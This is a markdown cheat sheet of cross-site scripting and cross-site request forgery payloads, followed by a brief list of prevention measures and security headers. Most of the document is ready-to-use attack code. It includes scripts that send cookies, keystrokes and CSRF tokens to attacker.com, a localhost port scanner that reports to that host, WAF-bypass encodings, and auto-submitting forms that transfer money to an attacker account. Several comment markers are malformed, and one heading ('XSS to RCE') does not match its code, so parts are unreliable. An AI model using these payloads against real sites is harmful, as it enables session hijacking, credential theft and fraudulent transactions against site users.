# XSS and CSRF Comprehensive Guide

---

## Cross-Site Scripting (XSS)

### Reflected XSS
```html
<!-- Basic payload -->
<script>alert('XSS')</script>

<!-- Image tag -->
<img src=x onerror=alert('XSS')>

<!-- SVG -->
<svg onload=alert('XSS')>

<!-- JavaScript protocol -->
javascript:alert('XSS')

<!-- Event handler -->
<body onload=alert('XSS')>

<!-- Input field -->
<input onfocus=alert('XSS') autofocus>

-- Link -->
<a href="javascript:alert('XSS')">Click me</a>
```

### Stored XSS
```html
<!-- Stored in database, executed for all users -->
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key='+e.key);
};
</script>

-- Session hijacking -->
<script>
var img = new Image();
img.src = 'https://attacker.com/steal?session=' + document.cookie;
</script>
```

### DOM-Based XSS
```javascript
// Vulnerable code: var hash = location.hash.slice(1); document.write(hash);
// Payload: #<img src=x onerror=alert('XSS')>

// Vulnerable code: eval(location.hash.slice(1));
// Payload: #alert('XSS')

-- Vulnerable code: document.innerHTML = location.search;
// Payload: ?<img src=x onerror=alert('XSS')>
```

### Blind XSS
```html
<!-- Payload for admin panels, error logs, etc. -->
<script>
fetch('https://attacker.com/blind?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie))
</script>
```

### XSS Polyglots
```html
javascript://alert('XSS')
'"--></style></script><script>alert('XSS')</script>
" onclick="alert('XSS')"
' onerror='alert("XSS")'
```

### WAF Bypass
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Encoding -->
<img src=x onerror=alert&#40;'XSS'&#41;>
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>

-- JavaScript inside HTML -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

-- Template injection leading to XSS -->
{{constructor.constructor('alert("XSS")')()}}
```

### XSS to RCE
```javascript
// Steal session cookie
fetch('https://attacker.com/steal?c='+document.cookie);

-- Keylogger -->
<script>
var keys = '';
document.onkeydown = function(e) {
    keys += e.key;
    if(keys.length > 10) {
        fetch('https://attacker.com/keys?data='+btoa(keys));
        keys = '';
    }
};
</script>

-- CSRF token theft -->
<script>
var token = document.querySelector('input[name="csrf_token"]').value;
fetch('https://attacker.com/csrf?token='+token);
</script>

-- Internal port scan -->
<script>
for(var i=1; i<65535; i++) {
    var img = new Image();
    img.src = 'http://127.0.0.1:'+i+'/favicon.ico';
    img.onload = function() { fetch('https://attacker.com/port?p='+i); };
}
</script>
```

---

## Cross-Site Request Forgery (CSRF)

### Basic CSRF
```html
<!-- CSRF payload -->
<form action="https://target.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF
```html
<!-- Using enctype="text/plain" to send JSON -->
<form action="https://target.com/api/transfer" method="POST" enctype="text/plain">
    <input name='{"to":"attacker","amount":1000,"ignore":"' value='"}' type='hidden'>
</form>
```

### CSRF with XSS
```javascript
// If XSS exists on any subdomain, can bypass SameSite cookies
fetch('https://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
});
```

### Bypassing CSRF Tokens
```html
<!-- If token is in GET parameter, can be included -->
<img src="https://target.com/transfer?to=attacker&amount=1000&csrf_token=TOKEN">

-- If token validation is weak -->
<form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
```

---

## Prevention

### XSS Prevention
- Content Security Policy (CSP)
- Output encoding/escaping
- HttpOnly and Secure cookie flags
- X-XSS-Protection header (deprecated, use CSP instead)
- Input validation

### CSRF Prevention
- Synchronizer Token Pattern (CSRF tokens)
- SameSite cookie attribute
- Double Submit Cookie
- Custom request headers
- Referer/Origin header validation

### Security Headers
```
Content-Security-Policy: default-src 'self'; script-src 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
